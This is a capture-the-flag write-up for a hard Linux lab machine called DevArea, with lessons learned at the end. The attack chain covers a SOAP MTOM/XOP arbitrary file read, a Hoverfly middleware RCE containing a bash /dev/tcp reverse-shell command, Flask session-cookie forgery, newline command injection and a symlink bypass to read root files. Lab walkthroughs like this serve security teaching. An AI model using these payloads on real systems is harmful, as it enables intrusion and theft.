---
title: "DevArea"
os: Linux
difficulty: Hard
tags: [soap, xxe, arbitrary-file-read, jwt, rce, cve-2025-54123, flask, session-forgery, symlink-bypass, sudo-abuse]
---

## Overview

DevArea is a hard-difficulty Linux machine built around an internal SOAP web service. The path to a foothold runs through anonymous FTP access to a leaked `.jar` file, decompiling it to map out an Apache CXF SOAP endpoint, using that endpoint's attachment-handling feature to read arbitrary local files, and pivoting those leaked credentials into a Hoverfly RCE (CVE-2025-54123). Root comes from a locally-sourced Flask secret key used to forge an admin session, a command injection in a web dashboard, and a two-hop symlink trick that slips past the target script's own symlink-safety check.

## Reconnaissance

Started with a standard service scan against the target:

```
sudo nmap -sC -sV 10.129.16.201
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-28 14:53 CDT
Nmap scan report for 10.129.16.201
Host is up (0.054s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard

Nmap done: 1 IP address (1 host up) scanned in 38.48 seconds
```

Six open ports worth noting: FTP with anonymous login, SSH, a redirecting web server, a Jetty instance on 8080, a Go proxy server on 8500 that turned out to be a dead end (it only answers "This is a proxy server" to direct requests), and a Hoverfly Dashboard on 8888. Added `devarea.htb` to `/etc/hosts` and took a look at the homepage.

![DevArea homepage](/assets/images/Pasted%20image%2020260328145728.png)

Browsing the site surfaced a team/about page and a testimonials section, both listing real employee names — useful for building a username list later even though they didn't end up being the way in.

![Team page listing employee names](/assets/images/Pasted%20image%2020260328155057.png)
![Testimonials section with additional names](/assets/images/Pasted%20image%2020260328155844.png)

VHost fuzzing came back empty, and a directory brute-force against port 80 only turned up `/assets` (301) and `/server-status` (403, as expected for Apache's default mod_status).

## Enumeration — FTP and a Leaked JAR

Anonymous FTP access dropped straight into a `pub` directory containing a single file:

```
ftp> cd pub
ftp> dir
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
ftp> get employee-service.jar
226 Transfer complete.
```

Unzipping the JAR revealed compiled classes for a small internal service:

```
$ unzip -l employee-service.jar
htb/devarea/ServerStarter.class
htb/devarea/EmployeeService.class
htb/devarea/EmployeeServiceImpl.class
htb/devarea/Report.class
```

Decompiling with `javap -verbose -p` on `ServerStarter.class` and `EmployeeServiceImpl.class` mapped out the whole service:

- It's an **Apache CXF SOAP web service** bound to `http://0.0.0.0:8080/employeeservice`
- The WSDL is served at `http://devarea.htb:8080/employeeservice?wsdl`
- The exposed `submitReport` method accepts a `Report` object with `employeeName`, `department`, `content`, and `confidential` fields, and echoes a greeting built from them

That echo behavior confirmed the service was live and reflecting input:

```
$ curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope ...><employeeName>test</employeeName>...'

Report received from test. Department: IT. Content: test
```

## Foothold — SOAP Attachment File Read to Hoverfly RCE

A SOAP service that echoes user-controlled XML is a natural place to try XXE. A classic `<!DOCTYPE>`-based external entity injection was rejected outright by the server:

```
$ curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
...<employeeName>&xxe;</employeeName>...'

<faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT...
```

Apache CXF was rejecting the DTD declaration outright — a common (and correct) XXE mitigation. Rather than fight that control, the better angle was Apache CXF's own MTOM/XOP attachment handling: SOAP requests can reference external content via an `<xop:Include>` tag inside a `multipart/related` request, and CXF will happily dereference a `file://` URI given there — no DTD required, so the earlier mitigation never comes into play:

```
$ curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/"><soapenv:Body><tns:submitReport><arg0><confidential>false</confidential><content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></content><department>IT</department><employeeName>test</employeeName></arg0></tns:submitReport></soapenv:Body></soapenv:Envelope>\r\n------=_Part_1--' \
  | python3 -c "import sys,base64,re; d=sys.stdin.read(); m=re.search(r'Content: (.+?)</return>', d); print(base64.b64decode(m.group(1)).decode())"

root:x:0:0:root:/root:/bin/bash
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
```

That confirmed a real user (`dev_ryan`) and a service account (`syswatch`) worth tracking. Wrapped the technique in a small `read_file()` shell function to make repeat reads less painful, then targeted the systemd unit for the Hoverfly service seen on port 8888:

```
$ read_file /etc/systemd/system/hoverfly.service

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

Hoverfly runs as `dev_ryan`, and its admin credentials were sitting right there in the unit file. Logged into the dashboard with `admin:O7IJ27MyyXiU`.

![Hoverfly dashboard login](/assets/images/Pasted%20image%2020260328154335.png)

With valid admin credentials in hand, a previously-noted advisory became directly exploitable: [CVE-2025-54123](https://github.com/advisories/GHSA-r4h8-hfp2-ggmf), a Hoverfly RCE via its insecure middleware feature at `/api/v2/hoverfly/middleware`. Hoverfly lets an authenticated admin configure an arbitrary "middleware" binary and script to process traffic — which means an authenticated admin can just tell it to run a reverse shell.

Grabbed an auth token first:

```
$ TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

Then set the middleware to spawn a reverse shell:

```
$ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/10.10.15.185/4444 0>&1"}'
```

![Confirming middleware update in the Hoverfly dashboard](/assets/images/Pasted%20image%2020260328171432.png)

```
$ nc -lvnp 4444
connect to [10.10.15.185] from (UNKNOWN) [10.129.16.201] 35418
dev_ryan@devarea:/opt/HoverFly$ 
```

Shell as `dev_ryan`. User flag:

```
dev_ryan@devarea:~$ cat user.txt
230c2f56e510247b659dae39264303f5
```

## Privilege Escalation — Session Forgery and a Symlink Bypass

Since the reverse shell from the Hoverfly middleware trick was a bit fragile, the first move was generating a local SSH keypair and appending the public key to `dev_ryan`'s `authorized_keys` through the existing shell, to get a stable SSH session instead of re-triggering the middleware RCE every time.

`sudo -l` showed a scoped but interesting rule:

```
dev_ryan@devarea:~$ sudo -l
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

`dev_ryan` can run essentially any subcommand of `syswatch.sh` as root — only `web-stop` and `web-restart` are blacklisted. A `syswatch-v1.zip` sitting in the home directory contained the full source: the CLI script itself, its plugins, and a Flask-based web GUI (`syswatch_gui/app.py`) bound to `127.0.0.1:7777`.

Reading `syswatch.sh` turned up two useful facts:

- `execute_plugin()` runs most plugins as the low-privilege `syswatch` user via `runuser`, **except** `log_monitor.sh`, which is allowed to run as root.
- The `logs` subcommand (`view_logs()`) reads files from `/opt/syswatch/logs` and includes symlink handling that *looks* safe — it blocks any symlink whose target string contains `/`, `..`, or `\`.

`/etc/syswatch.env` was world-readable and contained both the web GUI's admin password and, more importantly, its Flask session-signing secret:

```
dev_ryan@devarea:~$ cat /etc/syswatch.env
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

Flask signs its session cookies with this key, so knowing it means forging a trusted admin session without ever touching the login form:

```
$ flask-unsign --sign \
  --cookie '{"user_id": 1, "username": "admin"}' \
  --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'

eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ach04Q.d_RMeCdOHO1BcMQqX76sNYgG92Y
```

The forged cookie authenticated cleanly against the local-only web GUI, reachable now over the stable SSH session:

```
dev_ryan@devarea:~$ curl -s -b "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ach04Q.d_RMeCdOHO1BcMQqX76sNYgG92Y" \
  http://127.0.0.1:7777/ | head -5
<title>SysWatch Dashboard</title>
...
<span>admin</span>
```

The dashboard's `/service-status` feature checks a service's systemd status and includes a client-side regex (`^[A-Za-z0-9_.-]{1,64}$`) restricting the input field — but that validation is JavaScript only. Submitting a raw POST with an embedded newline bypassed it entirely and confirmed OS command injection running as the `syswatch` user:

```
$ curl -s -b "$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode "service=ssh
id"
...
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
```

That gave code execution as `syswatch` — the same user that owns `/opt/syswatch/logs`, and the same user `log_monitor.sh` (the one root-run plugin) reads from. But `view_logs()`'s own symlink check blocks any target string containing a literal `/`, which rules out symlinking straight to `/root/root.txt`. The way around it: a **two-hop symlink chain**. The script only re-checks the *first* symlink it opens — if that first symlink points to a second, safe-looking bare filename (no slash at all), the script never re-validates *where that second file points*, because its final `-f` test and `cat` both transparently follow the whole chain on the filesystem's own terms.

First, create the dangerous link — a symlink named `chain` pointing straight at `/root/root.txt`. Since a literal `/` in the injected command could itself get filtered, the slash and dot characters were built at execution time using Python subshells instead of typing them directly:

```
$ curl -s -b "$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode $'service=ssh\nln -sf $(python3 -c "print(chr(47))")root$(python3 -c "print(chr(47))")root$(python3 -c "print(chr(46))")txt $(python3 -c "print(chr(47))")opt$(python3 -c "print(chr(47))")syswatch$(python3 -c "print(chr(47))")logs$(python3 -c "print(chr(47))")chain'
```

Then create the second, "safe-looking" link — `evil.log`, whose target is just the bare word `chain` (no slash, so it sails through the check):

```
$ curl -s -b "$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode $'service=ssh\nln -sf chain $(python3 -c "print(chr(47))")opt$(python3 -c "print(chr(47))")syswatch$(python3 -c "print(chr(47))")logs$(python3 -c "print(chr(47))")evil$(python3 -c "print(chr(46))")log'
```

With the chain in place — `evil.log → chain → /root/root.txt` — the sudo-permitted root command follows it straight through:

```
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs evil.log
3adb09e8e4dfe909b2ab56c78de69929
```

## Root

```
3adb09e8e4dfe909b2ab56c78de69929
```

## Lessons Learned

- Rejecting `<!DOCTYPE>` declarations blocks classic XXE, but it doesn't close every file-read path in a SOAP stack — MTOM/XOP attachment handling is a separate feature with its own external-reference behavior, and needs to be locked down independently.
- Leaking service unit files is a direct credential leak. `ExecStart` lines routinely contain plaintext passwords passed as command-line arguments — treat any local file read as a potential credentials disclosure, not just a curiosity.
- A signing secret is a master key. Once `SYSWATCH_SECRET_KEY` was readable, every session the application could ever issue was forgeable offline — server-side auth checks are meaningless if the thing that makes a session trustworthy is exposed.
- Client-side input validation is not a security control. The `/service-status` regex only ran in the browser; the server never re-checked it.
- Defense-in-depth needs to hold at every hop, not just the first one. The symlink check in `view_logs()` was a reasonable idea applied incompletely — it validated the immediate target but trusted whatever that target pointed to next, which is exactly what a two-hop chain is built to exploit.

© 2026 RudeRaph
